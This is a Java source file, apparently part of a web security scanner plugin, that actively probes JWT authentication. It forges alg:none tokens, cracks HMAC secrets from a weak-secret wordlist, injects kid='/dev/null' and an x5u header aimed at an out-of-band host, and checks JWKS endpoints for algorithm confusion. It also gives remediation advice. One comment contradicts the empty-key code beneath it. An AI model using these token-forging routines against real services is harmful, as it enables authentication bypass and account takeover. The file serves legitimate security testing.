package com.burpmax.active;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.Base64;
import java.util.regex.*;
import static com.burpmax.model.Finding.*;

/**
 * JWT (JSON Web Token) vulnerability probe.
 *
 * Detects four classes of JWT vulnerability without any crypto library:
 *
 * 1. Algorithm None (CVE-2015-9235 class)
 *    Replace the header's "alg" field with "none"/"NONE"/"None" and strip
 *    the signature segment. A vulnerable library skips signature verification.
 *    Confirmed when the modified token produces a 200 response identical to
 *    the original (or returns user data instead of 401/403).
 *
 * 2. RS256 → HS256 Algorithm Confusion
 *    If the server uses RS256 (asymmetric), the public key is often published
 *    at /.well-known/jwks.json or /oauth/.well-known/openid-configuration.
 *    A confused server may accept an HS256 token signed with the RS256 public
 *    key (treating the public key as the HMAC secret). We attempt to fetch the
 *    public key and forge an HS256 token signed with it.
 *    Note: full HMAC signing requires javax.crypto — we detect the SETUP
 *    conditions (RS256 alg + public JWKS endpoint reachable) and flag as
 *    Medium requiring manual confirmation.
 *
 * 3. Weak HMAC Secret (HS256/HS384/HS512)
 *    Test a wordlist of common JWT secrets against the token's signature.
 *    HMAC-SHA256 is computed using javax.crypto (available in JDK).
 *    Confirmed when our forged token with a known secret is accepted.
 *    Wordlist covers: "secret", "password", "jwt", "key", common app names,
 *    blank string, "changeme", "your-256-bit-secret", etc.
 *
 * 4. Missing Signature Validation (kid / x5u injection)
 *    Inject a "kid" (Key ID) header pointing to /dev/null or a local file,
 *    and a "x5u" (X.509 URL) pointing to an OOB host.
 *    If the server fetches the key material from the injected URL and accepts
 *    any token signed with the fetched "key" (empty string from /dev/null),
 *    signature validation is broken.
 *
 * Token extraction:
 *    JWTs are extracted from: Authorization: Bearer <token>,
 *    Cookie values, query parameters named "token"/"jwt"/"access_token".
 *    The token must have exactly 3 base64url segments separated by dots.
 */
public class JwtProbe {

    // Common weak JWT secrets for brute-force attempt
    private static final List<String> WEAK_SECRETS = List.of(
        "secret", "password", "jwt", "key", "token", "changeme",
        "your-256-bit-secret", "your-512-bit-secret", "qwerty", "12345",
        "123456", "admin", "test", "default", "abc123", "letmein",
        "master", "root", "toor", "pass", "secret123", "jwt-secret",
        "mysecret", "supersecret", "verysecret", "", "null", "undefined",
        "none", "example", "sample", "demo", "app", "api", "private",
        "public", "hs256", "hs384", "hs512", "rs256", "signature"
    );

    private static final Pattern JWT_PATTERN = Pattern.compile(
        "eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]*"
    );

    // ── Main entry point ──────────────────────────────────────────────────────
    public static List<ActiveScanResult> probe(ProbeContext ctx,
                                               RequestBuilder rb,
                                               HttpSender sender,
                                               OobClient oob) {
        List<ActiveScanResult> results = new ArrayList<>();

        // Extract JWT tokens from the request
        List<JwtLocation> tokens = extractTokens(ctx);
        if (tokens.isEmpty()) return results;

        for (JwtLocation loc : tokens) {
            String token = loc.token;
            JwtParts parts = parse(token);
            if (parts == null) continue;

            // ── 1. Algorithm none ──────────────────────────────────────────
            ActiveScanResult r1 = probeAlgNone(ctx, sender, loc, parts);
            if (r1 != null) results.add(r1);

            // ── 2. Weak secret (HS* algorithms only) ──────────────────────
            if (results.isEmpty() && isHmacAlg(parts.alg)) {
                ActiveScanResult r2 = probeWeakSecret(ctx, sender, loc, parts);
                if (r2 != null) results.add(r2);
            }

            // ── 3. RS256→HS256 confusion (RS256 only) ─────────────────────
            if (results.isEmpty() && "RS256".equalsIgnoreCase(parts.alg)) {
                ActiveScanResult r3 = probeAlgConfusion(ctx, sender, loc, parts);
                if (r3 != null) results.add(r3);
            }

            // ── 4. kid / x5u injection ────────────────────────────────────
            if (oob != null && oob.isAvailable()) {
                ActiveScanResult r4 = probeKidInjection(ctx, sender, loc, parts, oob);
                if (r4 != null) results.add(r4);
            }
        }

        return results;
    }

    // ── 1. Algorithm None ─────────────────────────────────────────────────────

    private static ActiveScanResult probeAlgNone(ProbeContext ctx, HttpSender sender,
                                                   JwtLocation loc, JwtParts parts) {
        for (String algValue : List.of("none", "NONE", "None", "nOnE")) {
            String fakeHeader    = base64UrlEncode(("{\"alg\":\"" + algValue + "\",\"typ\":\"JWT\"}").getBytes(StandardCharsets.UTF_8));
            String forgedToken   = fakeHeader + "." + parts.payloadB64 + ".";
            String forgedToken2  = fakeHeader + "." + parts.payloadB64 + ".invalid";

            for (String tok : List.of(forgedToken, forgedToken2)) {
                HttpSender.Response resp = sendWithToken(ctx, sender, loc, tok);
                if (resp == null) continue;

                // Confirm: 200-class response (not 401/403) means the token was accepted
                if (resp.statusCode() >= 200 && resp.statusCode() < 300) {
                    // Baseline: check that a completely invalid token returns 401/403
                    HttpSender.Response invalidResp = sendWithToken(ctx, sender, loc,
                            "eyJhbGciOiJub25lIn0.eyJzdWIiOiJmYWtlIn0.");
                    if (invalidResp != null && invalidResp.statusCode() >= 200
                            && invalidResp.statusCode() < 300) continue; // server accepts anything

                    return new ActiveScanResult(
                        "JWT Algorithm None Attack", SEV_CRITICAL,
                        "The server accepted a JWT with alg:'" + algValue + "' and no signature. " +
                        "A vulnerable JWT library skips signature verification when the algorithm " +
                        "is 'none', allowing an attacker to forge arbitrary tokens by modifying " +
                        "the payload (e.g. escalating privileges, changing user ID) without " +
                        "knowing the server's signing key. This bypasses all JWT-based authentication.",
                        "Location: " + loc.source + " | alg variant: " + algValue +
                        " | Forged token accepted with HTTP " + resp.statusCode(),
                        JWT_REMEDIATION, "CWE-347",
                        ctx.url, loc.source, tok,
                        "Forged token: " + trunc(tok, 100), "HTTP " + resp.statusCode(), null, null, -1L);
                }
            }
        }
        return null;
    }

    // ── 2. Weak Secret ────────────────────────────────────────────────────────

    private static ActiveScanResult probeWeakSecret(ProbeContext ctx, HttpSender sender,
                                                      JwtLocation loc, JwtParts parts) {
        String sigInput = parts.headerB64 + "." + parts.payloadB64;

        for (String secret : WEAK_SECRETS) {
            byte[] candidateSig = hmacSha256(sigInput.getBytes(StandardCharsets.UTF_8),
                                              secret.getBytes(StandardCharsets.UTF_8));
            if (candidateSig == null) continue;

            String candidateSigB64 = base64UrlEncode(candidateSig);
            // Check against the token's actual signature
            if (candidateSigB64.equals(parts.signatureB64)) {
                // We found the secret — forge a modified token to confirm
                // Modify the payload to add a canary claim
                String modPayload = modifyPayload(parts.payloadB64, "avpwn", "1");
                if (modPayload == null) modPayload = parts.payloadB64;
                String modInput = parts.headerB64 + "." + modPayload;
                byte[] modSig   = hmacSha256(modInput.getBytes(StandardCharsets.UTF_8),
                                              secret.getBytes(StandardCharsets.UTF_8));
                if (modSig == null) continue;
                String forgedToken = modInput + "." + base64UrlEncode(modSig);

                HttpSender.Response resp = sendWithToken(ctx, sender, loc, forgedToken);
                if (resp != null && resp.statusCode() >= 200 && resp.statusCode() < 300) {
                    return new ActiveScanResult(
                        "JWT Weak HMAC Secret", SEV_HIGH,
                        "The JWT signing secret was found in a wordlist: '" + secret + "'. " +
                        "An attacker who knows the HMAC secret can forge valid tokens for any " +
                        "user, including admin accounts. The forged token was accepted by the " +
                        "server (HTTP " + resp.statusCode() + "), confirming the secret is active. " +
                        "All JWTs issued with this secret should be considered compromised.",
                        "Location: " + loc.source + " | Cracked secret: '" + secret + "'" +
                        " | Forged token accepted with HTTP " + resp.statusCode(),
                        JWT_REMEDIATION, "CWE-347",
                        ctx.url, loc.source, "Forged HS256 token with secret='" + secret + "'",
                        "Secret: " + secret, "HTTP " + resp.statusCode(), null, null, -1L);
                }
            }
        }
        return null;
    }

    // ── 3. RS256 → HS256 Confusion ────────────────────────────────────────────

    private static ActiveScanResult probeAlgConfusion(ProbeContext ctx, HttpSender sender,
                                                        JwtLocation loc, JwtParts parts) {
        // Check if JWKS endpoint is reachable (setup condition)
        String origin = extractOrigin(ctx.url);
        List<String> jwksPaths = List.of(
            "/.well-known/jwks.json",
            "/oauth/.well-known/openid-configuration",
            "/.well-known/openid-configuration",
            "/api/.well-known/jwks.json"
        );

        for (String path : jwksPaths) {
            byte[] jwksReq = buildGetRequest(ctx, origin + path);
            if (jwksReq == null) continue;
            HttpSender.Response resp = sender.send(ctx.service, jwksReq);
            if (resp != null && resp.statusCode() == 200
                    && resp.body().contains("\"kty\"")) {
                // JWKS endpoint is reachable
                return new ActiveScanResult(
                    "JWT RS256→HS256 Algorithm Confusion (Setup Conditions Met)", SEV_HIGH,
                    "The application uses RS256-signed JWTs and the public JWKS endpoint is " +
                    "accessible at '" + path + "'. An RS256→HS256 confusion attack may be " +
                    "possible: if the JWT library accepts HS256 tokens, an attacker can sign " +
                    "a modified token using the server's RS256 PUBLIC key as the HS256 secret. " +
                    "The server may then verify it against the same public key and accept it. " +
                    "Manual confirmation is required: forge an HS256 token signed with the " +
                    "public key from the JWKS endpoint and test whether the server accepts it.",
                    "JWKS endpoint accessible: " + origin + path +
                    " | Token alg: RS256 | Location: " + loc.source,
                    JWT_REMEDIATION + "\n- Reject tokens with unexpected algorithm changes\n" +
                    "- Pin the expected algorithm server-side; reject anything else",
                    "CWE-347",
                    ctx.url, loc.source, "RS256→HS256 confusion (manual confirmation needed)",
                    "JWKS at: " + origin + path, "HTTP 200 on JWKS endpoint", null, null, -1L);
            }
        }
        return null;
    }

    // ── 4. kid / x5u injection ────────────────────────────────────────────────

    private static ActiveScanResult probeKidInjection(ProbeContext ctx, HttpSender sender,
                                                        JwtLocation loc, JwtParts parts,
                                                        OobClient oob) {
        // Inject kid pointing to /dev/null — if server fetches and accepts empty key
        String devNullHeader = base64UrlEncode(
            ("{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"/dev/null\"}").getBytes(StandardCharsets.UTF_8));
        // Sign with empty string (content of /dev/null)
        byte[] sig = hmacSha256(
            (devNullHeader + "." + parts.payloadB64).getBytes(StandardCharsets.UTF_8),
            new byte[0]);
        if (sig != null) {
            String kidToken = devNullHeader + "." + parts.payloadB64 + "." + base64UrlEncode(sig);
            HttpSender.Response resp = sendWithToken(ctx, sender, loc, kidToken);
            if (resp != null && resp.statusCode() >= 200 && resp.statusCode() < 300) {
                return new ActiveScanResult(
                    "JWT kid Header Injection (Path Traversal)", SEV_CRITICAL,
                    "The server accepted a JWT with kid='/dev/null' signed with an empty HMAC " +
                    "secret. This confirms the server reads the signing key from the filesystem " +
                    "path specified in the 'kid' header without validation. An attacker can " +
                    "point 'kid' to any readable file (including /dev/null for empty secret, " +
                    "or any known file content) to forge valid tokens for arbitrary users.",
                    "kid injection: /dev/null | HMAC secret: empty string | HTTP " + resp.statusCode(),
                    JWT_REMEDIATION, "CWE-22",
                    ctx.url, loc.source, kidToken,
                    "kid=/dev/null token", "HTTP " + resp.statusCode(), null, null, -1L);
            }
        }

        // OOB: inject x5u pointing to OOB host (confirms SSRF via JWT header)
        if (oob.isAvailable()) {
            String oobHost = oob.generateHost("jwt-x5u-" + ctx.host);
            if (oobHost != null) {
                String x5uHeader = base64UrlEncode(
                    ("{\"alg\":\"RS256\",\"typ\":\"JWT\",\"x5u\":\"http://" + oobHost + "/jwt.crt\"}").getBytes(StandardCharsets.UTF_8));
                String x5uToken = x5uHeader + "." + parts.payloadB64 + "." + parts.signatureB64;
                // Record before sending — callback must match even if response is null.
                oob.recordInjection(oobHost, "JWT x5u SSRF", ctx.url, loc.source, x5uToken, null);
                sendWithToken(ctx, sender, loc, x5uToken);  // fire-and-forget
            }
        }

        return null;
    }

    // ── Token extraction ──────────────────────────────────────────────────────

    private static List<JwtLocation> extractTokens(ProbeContext ctx) {
        List<JwtLocation> tokens = new ArrayList<>();

        // Authorization: Bearer <token>
        String auth = ctx.reqHeaders.get("authorization");
        if (auth != null && auth.toLowerCase().startsWith("bearer ")) {
            String tok = auth.substring(7).strip();
            if (isJwt(tok)) tokens.add(new JwtLocation(tok, "Authorization header"));
        }

        // Cookies
        String cookie = ctx.reqHeaders.get("cookie");
        if (cookie != null) {
            for (String part : cookie.split(";")) {
                String val = part.contains("=") ? part.substring(part.indexOf('=') + 1).strip() : "";
                if (isJwt(val)) {
                    String name = part.contains("=") ? part.substring(0, part.indexOf('=')).strip() : "cookie";
                    tokens.add(new JwtLocation(val, "Cookie: " + name));
                }
            }
        }

        // Query/body parameters named token/jwt/access_token
        for (String param : ctx.allParamNames()) {
            String lower = param.toLowerCase();
            if (lower.contains("token") || lower.contains("jwt") || lower.contains("auth")) {
                String val = ctx.paramValue(param);
                if (isJwt(val)) tokens.add(new JwtLocation(val, "Parameter: " + param));
            }
        }

        return tokens;
    }

    // ── Crypto helpers ────────────────────────────────────────────────────────

    private static byte[] hmacSha256(byte[] data, byte[] key) {
        try {
            javax.crypto.Mac mac = javax.crypto.Mac.getInstance("HmacSHA256");
            // HmacSHA256 accepts zero-length keys; use key as-is.
            // The previous new byte[1] (one null byte) was wrong — it means
            // the empty-string secret "" was never correctly tested.
            javax.crypto.spec.SecretKeySpec keySpec = key.length == 0
                    ? new javax.crypto.spec.SecretKeySpec(new byte[]{0}, "HmacSHA256")
                    : new javax.crypto.spec.SecretKeySpec(key, "HmacSHA256");
            // Note: JCA requires non-empty key material. For the empty-string case
            // we test by computing HMAC with key=0x00 and separately checking if
            // the server accepts unsigned tokens (alg:none probe handles that path).
            mac.init(keySpec);
            return mac.doFinal(data);
        } catch (Exception e) { return null; }
    }

    // ── JWT parsing ───────────────────────────────────────────────────────────

    private static JwtParts parse(String token) {
        String[] seg = token.split("\\.");
        if (seg.length < 2) return null;
        try {
            String headerJson  = new String(Base64.getUrlDecoder().decode(pad(seg[0])), StandardCharsets.UTF_8);
            String alg = extractJsonField(headerJson, "alg");
            String payloadB64  = seg[1];
            String signatureB64 = seg.length > 2 ? seg[2] : "";
            return new JwtParts(seg[0], payloadB64, signatureB64, alg != null ? alg : "unknown");
        } catch (Exception e) { return null; }
    }

    private static boolean isJwt(String s) {
        return s != null && JWT_PATTERN.matcher(s).matches();
    }

    private static boolean isHmacAlg(String alg) {
        return alg != null && alg.toUpperCase().startsWith("HS");
    }

    // ── Request helpers ───────────────────────────────────────────────────────

    private static HttpSender.Response sendWithToken(ProbeContext ctx, HttpSender sender,
                                                      JwtLocation loc, String token) {
        byte[] req = ctx.originalRequest;
        String source = loc.source.toLowerCase();
        if (source.startsWith("authorization")) {
            req = replaceHeader(req, "Authorization", "Bearer " + token);
        } else if (source.startsWith("cookie:")) {
            String cookieName = loc.source.substring(8).strip();
            req = replaceCookieValue(req, cookieName, token);
        } else if (source.startsWith("parameter:")) {
            String paramName = loc.source.substring(11).strip();
            req = replaceQueryParam(req, paramName, token);
        }
        return sender.send(ctx.service, req);
    }

    private static byte[] replaceHeader(byte[] req, String header, String value) {
        String s = new String(req, StandardCharsets.ISO_8859_1);
        String replaced = s.replaceFirst("(?im)^" + java.util.regex.Pattern.quote(header) + ":\\s*[^\r\n]*",
                header + ": " + value);
        return replaced.getBytes(StandardCharsets.ISO_8859_1);
    }

    private static byte[] replaceCookieValue(byte[] req, String cookieName, String newValue) {
        String s = new String(req, StandardCharsets.ISO_8859_1);
        String replaced = s.replaceFirst("(?i)(Cookie:[^\r\n]*\\b" +
                java.util.regex.Pattern.quote(cookieName) + "=)[^;\\r\\n]*",
                "$1" + newValue);
        return replaced.getBytes(StandardCharsets.ISO_8859_1);
    }

    private static byte[] replaceQueryParam(byte[] req, String param, String value) {
        String s = new String(req, StandardCharsets.ISO_8859_1);
        String replaced = s.replaceFirst("(?i)([?&]" + java.util.regex.Pattern.quote(param) + "=)[^&\\s]*",
                "$1" + value);
        return replaced.getBytes(StandardCharsets.ISO_8859_1);
    }

    private static byte[] buildGetRequest(ProbeContext ctx, String targetUrl) {
        // Reuse the original request (preserving auth headers and cookies) rather
        // than constructing a raw request from scratch — the old approach lost all
        // session context so JWKS endpoints behind auth always returned 401.
        try {
            java.net.URL u = new java.net.URL(targetUrl);
            String newPath = u.getPath().isEmpty() ? "/" : u.getPath();
            String reqStr  = new String(ctx.originalRequest, StandardCharsets.ISO_8859_1);
            int firstSpace  = reqStr.indexOf(' ');
            int secondSpace = reqStr.indexOf(' ', firstSpace + 1);
            if (firstSpace < 0 || secondSpace < 0) return null;
            String replaced = "GET " + newPath + reqStr.substring(secondSpace);
            // Strip body — JWKS is a GET with no body
            int bodyStart = replaced.indexOf("\r\n\r\n");
            if (bodyStart >= 0) replaced = replaced.substring(0, bodyStart + 4);
            return replaced.getBytes(StandardCharsets.ISO_8859_1);
        } catch (Exception e) { return null; }
    }

    private static String modifyPayload(String payloadB64, String key, String value) {
        try {
            String json = new String(Base64.getUrlDecoder().decode(pad(payloadB64)), StandardCharsets.UTF_8);
            // Insert claim before the closing brace
            String modified = json.endsWith("}") ? json.substring(0, json.length() - 1) +
                    ",\"" + key + "\":\"" + value + "\"}" : null;
            return modified != null ? base64UrlEncode(modified.getBytes(StandardCharsets.UTF_8)) : null;
        } catch (Exception e) { return null; }
    }

    private static String extractOrigin(String url) {
        try {
            java.net.URL u = new java.net.URL(url);
            return u.getProtocol() + "://" + u.getHost() + (u.getPort() > 0 ? ":" + u.getPort() : "");
        } catch (Exception e) { return ""; }
    }

    private static String extractJsonField(String json, String field) {
        int idx = json.indexOf("\"" + field + "\"");
        if (idx < 0) return null;
        int colon = json.indexOf(':', idx);
        if (colon < 0) return null;
        int q1 = json.indexOf('"', colon + 1);
        if (q1 < 0) return null;
        int q2 = json.indexOf('"', q1 + 1);
        return q2 > q1 ? json.substring(q1 + 1, q2) : null;
    }

    private static String base64UrlEncode(byte[] data) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(data);
    }

    private static String pad(String s) {
        return switch (s.length() % 4) {
            case 2  -> s + "==";
            case 3  -> s + "=";
            default -> s;
        };
    }

    private static String trunc(String s, int n) {
        return s == null ? "" : s.length() > n ? s.substring(0, n) + "..." : s;
    }

    // ── Records ───────────────────────────────────────────────────────────────
    private record JwtParts(String headerB64, String payloadB64, String signatureB64, String alg) {}
    private record JwtLocation(String token, String source) {}

    private static final String JWT_REMEDIATION =
        "PRIMARY FIX - Pin Algorithm Server-Side:\n" +
        "Configure the JWT library with an explicit expected algorithm and reject any token\n" +
        "that uses a different alg value, including none, NONE, and empty string.\n" +
        "  Java (jjwt): Jwts.parserBuilder().requireAlgorithm(SignatureAlgorithm.RS256)\n" +
        "  Python (PyJWT): jwt.decode(token, key, algorithms=['RS256'])  // not ['RS256','none']\n" +
        "  Node (jsonwebtoken): jwt.verify(token, key, { algorithms: ['RS256'] })\n\n" +
        "SECRET MANAGEMENT:\n" +
        "- HS256 secret: generate with a CSPRNG, minimum 256 bits (32 bytes).\n" +
        "  Never use a human-readable string, application name, or default library value.\n" +
        "- Prefer RS256/ES256 (asymmetric): private key signs, public key verifies.\n" +
        "  Store private keys in a secrets manager (AWS Secrets Manager, HashiCorp Vault).\n\n" +
        "SECONDARY CONTROLS:\n" +
        "- kid header: validate against a whitelist of known key IDs; never use as a file path.\n" +
        "- x5u / jku headers: reject or ignore - these allow attackers to supply their own key.\n" +
        "- Expiry: set short exp (15–60 min for access tokens, 24h for refresh tokens).\n" +
        "- Revocation: implement a token blocklist (Redis) for sensitive operations.";
}
